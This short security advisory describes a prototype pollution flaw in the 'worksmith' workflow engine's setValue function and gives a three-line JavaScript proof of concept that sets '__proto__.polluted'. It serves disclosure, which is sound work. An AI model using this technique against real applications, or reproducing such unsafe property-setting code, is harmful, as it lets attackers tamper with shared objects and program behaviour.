# Overview

`worksmith` is a purely functional workflow engine, this package is vulnerable to Prototype Pollution via the setValue function.

# Proof of Concept
```
const worksmith = require('worksmith'); 
worksmith.setValue({}, '__proto__.polluted', true); 
console.log(polluted); // true
```